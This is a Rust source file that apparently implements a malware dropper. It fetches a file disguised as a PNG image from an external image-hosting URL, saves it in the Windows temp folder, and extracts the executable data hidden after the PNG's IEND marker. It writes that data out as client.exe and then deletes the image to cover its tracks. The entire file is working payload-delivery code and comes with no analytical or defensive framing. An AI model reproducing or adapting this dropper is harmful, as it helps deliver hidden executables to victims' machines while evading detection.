use std::fs::{File, OpenOptions, remove_file};
use std::io::{Read, Write, copy};
use std::process;

const PNG_PATH: &str = "C:\\Windows\\Temp\\08892F3D1BAD5.png";
const PAYLOAD_PATH: &str = "client.exe";
const PAYLOAD_LINK: &str = "https://i.postimg.cc/rqxBdwQM/bart-simpson-png-21-new.png?dl=1";

pub async fn download_payload() -> Result<(), Box<dyn std::error::Error>> {
    let response = reqwest::get(PAYLOAD_LINK).await?; // Make the GET request
    if !response.status().is_success() {
        return Err(format!("Failed to download file: HTTP {}", response.status()).into());
    }

    let mut file = File::create(PNG_PATH)?; // Create the output file
    let content = response.bytes().await?; // Get the file content
    copy(&mut content.as_ref(), &mut file)?;   // Write content to the file

    extract_payload();

    remove_file(PNG_PATH)?;

    Ok(())
}


fn extract_payload() {
    let iend_sequence: [u8; 0x04] = [0x49, 0x45, 0x4E, 0x44];

    let mut file = match File::open(PNG_PATH) {
        Ok(file) => file,
        Err(err) => {
            eprintln!("{}",err);
            process::exit(1);
        }
    };

    let mut content = Vec::new();
    if let Err(err) = file.read_to_end(&mut content) {
        eprintln!("{}",err);
        process::exit(1);
    }

    if let Some(iend_index) = content.windows(iend_sequence.len()).position(|window| window == iend_sequence) {
        let appended_data_start = iend_index + iend_sequence.len();

        let appended_data = &content[appended_data_start..];

        if appended_data.is_empty() {
            process::exit(1);
        }

        let mut output_file = match OpenOptions::new().write(true).create(true).open(PAYLOAD_PATH) {
            Ok(file) => file,
            Err(err) => {
                eprintln!("{}",err);
                process::exit(1);
            }
        };

        if let Err(err) = output_file.write_all(appended_data) {
            eprintln!("{}",err);
            process::exit(1);
        }
    } else {
        process::exit(1);
    }
}
